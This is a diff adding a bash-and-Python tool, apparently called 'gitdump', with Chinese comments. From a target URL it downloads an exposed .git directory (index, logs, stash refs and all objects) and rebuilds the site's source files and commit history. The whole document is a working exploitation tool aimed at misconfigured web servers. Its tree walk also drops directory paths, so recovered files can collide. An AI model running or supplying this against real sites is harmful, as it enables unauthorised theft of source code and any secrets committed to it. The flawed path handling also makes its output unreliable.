@@ -1,0 +1,310 @@
+#!/usr/bin/env bash
+# gitdump -- .git 目录泄露恢复工具（零依赖：bash + python3）
+# 用法: gitdump <URL> [--out 目录]
+# 功能: 下载 .git/index + logs/HEAD + 全部 objects, 恢复所有历史提交文件清单
+set -e
+
+IN_FILE=""
+OUT_DIR="gitdump_restore"
+
+while [ "$#" -gt 0 ]; do
+    case "$1" in
+        --out)
+            OUT_DIR="$2"
+            shift 2
+            ;;
+        *)
+            IN_FILE="$1"
+            shift
+            ;;
+    esac
+done
+
+if [ -z "$IN_FILE" ]; then
+    echo "gitdump -- 恢复 .git 目录泄露的完整文件清单"
+    echo "用法: gitdump <URL> [--out 目录]"
+    echo "输出: 提交历史 + 恢复文件; 目录下生成 .git/ 完整对象库与全部文件"
+    echo "例子: gitdump http://目标/.git"
+    exit 0
+fi
+
+PY="
+import sys, zlib, os, struct, subprocess, tempfile, shutil, re
+
+url = sys.argv[1].rstrip('/')
+out = sys.argv[2]
+objects_dir = os.path.join(out, '.git', 'objects')
+
+def fetch(rel):
+    import urllib.request
+    req = urllib.request.Request(url + '/' + rel)
+    try:
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.read()
+    except Exception as e:
+        return None
+
+def try_fetch(rel):
+    d = fetch(rel)
+    if d is None or len(d) < 40:
+        return None
+    return d
+
+print('[*] 目标: ' + url)
+os.makedirs(objects_dir, exist_ok=True)
+
+# 1. 下载 index, 解析 DIRC 条目
+idx = fetch('.git/index')
+known_blobs = set()
+known_paths = set()
+if idx and idx[:4] == b'DIRC':
+    _, ver, count = struct.unpack('>4sII', idx[:12])
+    pos = 12
+    for i in range(count):
+        e = idx[pos:pos + 62]
+        if len(e) < 62:
+            break
+        sha = e[40:60].hex()
+        flags, = struct.unpack('>H', e[60:62])
+        plen = flags & 0x0FFF
+        ext = False
+        if flags & 0x4000:
+            ext = True
+        plen0 = plen
+        pos += 62
+        if ext:
+            # 扩展: 路径长度在 flags 后 8 字节的 32 位值(含 1B 前缀)
+            pos += 8
+        path = idx[pos:pos + plen0].decode('utf-8', 'replace')
+        known_paths.add(path)
+        known_blobs.add(sha)
+        pos += plen0
+        pos += 8 - ((pos - 12) % 8) if (pos - 12) % 8 else 0
+    print(f'[*] index: {count} 个文件, 起始对象 {len(known_blobs)}')
+else:
+    print('[!] index 不可用, 仅按日志恢复')
+
+# 2. 下载 logs/HEAD 拿全部 commit
+commits = []
+log = fetch('.git/logs/HEAD')
+if log:
+    for line in log.decode('utf-8', 'replace').splitlines():
+        parts = line.split()
+        if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+            sha = parts[1]
+            msg = ' '.join(parts[6:])
+            commits.append((sha, msg))
+    print(f'[*] 日志: {len(commits)} 次提交')
+else:
+    print('[!] logs/HEAD 不可用')
+
+# 2.5 探测 stash: refs/stash 与 logs/refs/stash（stash 引用不在分支上，git log 看不到，必须单独探测）
+stash_found = 0
+ref_stash = fetch('.git/refs/stash')
+if ref_stash and re.fullmatch(r'[0-9a-f]{40}', ref_stash.decode('utf-8', 'replace').strip()):
+    sha = ref_stash.decode().strip()
+    commits.append((sha, 'stash: (refs/stash)'))
+    stash_found += 1
+stash_log = fetch('.git/logs/refs/stash')
+if stash_log:
+    for line in stash_log.decode('utf-8', 'replace').splitlines():
+        parts = line.split()
+        if len(parts) >= 2 and re.fullmatch(r'[0-9a-f]{40}', parts[1]):
+            sha = parts[1]
+            msg = ' '.join(parts[6:])
+            commits.append((sha, 'stash: ' + msg))
+            stash_found += 1
+if stash_found:
+    print(f'[*] stash: 发现 {stash_found} 条 stash 记录')
+
+# 3. BFS 下载 objects
+def download_object(sha):
+    p = os.path.join(objects_dir, sha[:2], sha[2:])
+    if os.path.exists(p):
+        return True
+    d = fetch('.git/objects/' + sha[:2] + '/' + sha[2:])
+    if d is None:
+        return False
+    try:
+        zlib.decompress(d)
+    except Exception:
+        return False
+    os.makedirs(os.path.dirname(p), exist_ok=True)
+    with open(p, 'wb') as f:
+        f.write(d)
+    return True
+
+def parse_object(sha):
+    p = os.path.join(objects_dir, sha[:2], sha[2:])
+    with open(p, 'rb') as f:
+        raw = zlib.decompress(f.read())
+    nul = raw.index(b'\x00')
+    hdr = raw[:nul].decode()
+    body = raw[nul + 1:]
+    kind, _, size = hdr.partition(' ')
+    return kind, int(size), body
+
+def scan_tree(body):
+    names = []
+    blobs = []
+    pos = 0
+    while pos < len(body):
+        sp = body.index(b' ', pos)
+        mode = body[pos:sp].decode()
+        pos = sp + 1
+        nul = body.index(b'\x00', pos)
+        name = body[pos:nul].decode('utf-8', 'replace')
+        pos = nul + 1
+        sha = body[pos:pos + 20].hex()
+        pos += 20
+        names.append((name, sha, mode))
+        if mode == '40000':
+            pass
+        else:
+            blobs.append(sha)
+    return names, blobs
+
+seen = set()
+stack = [c[0] for c in commits]
+# 没有日志时用 HEAD
+if not stack:
+    head = fetch('.git/HEAD')
+    if head and head.startswith(b'ref:'):
+        ref = head.decode().split('ref:')[1].strip()
+        d = fetch('.git/' + ref)
+        if d and re.fullmatch(r'[0-9a-f]{40}', d.decode('utf-8', 'replace').strip()):
+            stack.append(d.decode().strip())
+    elif head and re.fullmatch(r'[0-9a-f]{40}', head.decode().strip()):
+        stack.append(head.decode().strip())
+
+all_blobs = set(known_blobs)
+download_count = 0
+while stack:
+    sha = stack.pop()
+    if sha in seen:
+        continue
+    seen.add(sha)
+    if not download_object(sha):
+        continue
+    download_count += 1
+    kind, size, body = parse_object(sha)
+    if kind == 'commit':
+        # 收集 parent 与 tree
+        for m in re.finditer(rb'^(parent|tree) ([0-9a-f]{40})', body, re.M):
+            stack.append(m.group(2).decode())
+    elif kind == 'tree':
+        names, blobs = scan_tree(body)
+        for n, s, mode in names:
+            stack.append(s)
+        for b in blobs:
+            all_blobs.add(b)
+
+for b in all_blobs:
+    if b not in seen:
+        stack.append(b)
+while stack:
+    sha = stack.pop()
+    if sha in seen:
+        continue
+    seen.add(sha)
+    if download_object(sha):
+        download_count += 1
+
+print(f'[*] 下载对象: {download_count}')
+
+# 4. 恢复文件: 对每个 commit, 解析 tree 链
+def resolve_tree(sha):
+    files = {}
+    stack = [sha]
+    while stack:
+        t = stack.pop()
+        kind, size, body = parse_object(t)
+        names, blobs = scan_tree(body)
+        for name, s, mode in names:
+            if mode == '40000':
+                stack.append(s)
+            else:
+                files[name] = s
+    return files
+
+print()
+print('[+] 提交历史:')
+for sha, msg in commits:
+    print(f'    {sha[:7]}  {msg}')
+if not commits:
+    print('    (无日志)')
+
+print()
+print('[+] 恢复文件:')
+all_files = set()
+printed = set()
+for sha, msg in commits:
+    if not download_object(sha):
+        continue
+    kind, size, body = parse_object(sha)
+    if kind != 'commit':
+        continue
+    m = re.search(rb'(^|\n)tree ([0-9a-f]{40})', body)
+    if not m:
+        continue
+    tree_sha = m.group(2).decode()
+    try:
+        files = resolve_tree(tree_sha)
+    except Exception:
+        continue
+    all_files.update(files.keys())
+    if sha not in printed:
+        printed.add(sha)
+        label = msg or 'none'
+        print(f'    commit {sha[:7]} ({label}):')
+        for name in sorted(files):
+            print(f'        {name}')
+
+# 5. 提取并写出所有 blob 内容（同名文件优先取 stash 版本，其次最新 commit）
+os.makedirs(out, exist_ok=True)
+count = 0
+for name in sorted(all_files):
+    chosen = None
+    chosen_msg = None
+    for sha, msg in commits:
+        if not download_object(sha):
+            continue
+        kind, size, body = parse_object(sha)
+        if kind != 'commit':
+            continue
+        m = re.search(rb'(^|\n)tree ([0-9a-f]{40})', body)
+        if not m:
+            continue
+        tree_sha = m.group(2).decode()
+        try:
+            files = resolve_tree(tree_sha)
+        except Exception:
+            continue
+        if name in files:
+            if msg.startswith('stash:'):
+                chosen = files[name]
+                chosen_msg = msg
+                break
+            if chosen is None:
+                chosen = files[name]
+                chosen_msg = msg
+    if chosen is not None:
+        blob = chosen
+        p = os.path.join(objects_dir, blob[:2], blob[2:])
+        if os.path.exists(p):
+            with open(p, 'rb') as f:
+                raw = zlib.decompress(f.read())
+            _, _, bbody = parse_object(blob)
+            dest = os.path.join(out, name)
+            os.makedirs(os.path.dirname(dest) or out, exist_ok=True)
+            with open(dest, 'wb') as f:
+                f.write(bbody)
+            count += 1
+print(f'[+] 写出文件: {count} 个 -> {out}/')
+print('    提示: 被删除的文件在历史提交里, 用 git log 与 git show <commit>:<file> 找回')
+"
+
+if [ ! -d "$OUT_DIR" ]; then
+    mkdir -p "$OUT_DIR"
+fi
+python3 - "$IN_FILE" "$OUT_DIR" <<<"$PY"
